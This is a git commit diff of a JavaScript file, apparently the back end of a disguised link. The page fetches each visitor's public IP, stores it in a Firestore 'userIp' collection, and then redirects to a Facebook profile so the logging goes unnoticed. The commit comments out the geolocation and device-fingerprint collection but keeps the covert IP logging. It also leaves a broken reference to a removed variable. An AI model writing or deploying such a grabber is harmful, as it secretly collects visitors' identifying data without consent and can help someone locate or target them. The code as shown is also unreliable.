c1dd9d3e84e22bcb813ef3873bd92a4a37388e9e
Abdullah-git-hub <74533464+Abdullah-git-hub@users.noreply.github.com>
2023-04-05 14:38:59 +0600

    Update main.js

--- main.js
+++ main.js
@@ -8,28 +8,29 @@ fetch('https://api.ipify.org/?format=json')
       .then(response => response.json())
       .then(data => {
 
-        const geoBasicInfo = {
-            ip_number: data.ip_number,
-            ip_version: data.ip_version,
-            country_name: data.country_name,
-            country_code2: data.country_code2,
-            isp: data.isp,
-        }
+//         const geoBasicInfo = {
+//             ip_number: data.ip_number,
+//             ip_version: data.ip_version,
+//             country_name: data.country_name,
+//             country_code2: data.country_code2,
+//             isp: data.isp,
+//         }
 
-        const deviceInfo = {
-          userAgent: navigator.userAgent,
-          language: navigator.language,
-          platform: navigator.platform,
-          screenWidth: window.screen.width,
-          screenHeight: window.screen.height,
-          networkeffectiveType: navigator.connection.effectiveType,
-          networkdownlink: navigator.connection.downlink,
-        };
+//         const deviceInfo = {
+//           userAgent: navigator.userAgent,
+//           language: navigator.language,
+//           platform: navigator.platform,
+//           screenWidth: window.screen.width,
+//           screenHeight: window.screen.height,
+//           networkeffectiveType: navigator.connection.effectiveType,
+//           networkdownlink: navigator.connection.downlink,
+//         };
 
         console.log(deviceInfo);
 
         db.collection("userIp").add({
-            ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
+            ipAddress, time: new Date(),
+//             ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
         }).then(_ => {
             window.location.replace("http://www.facebook.com/profile.php?")
         });
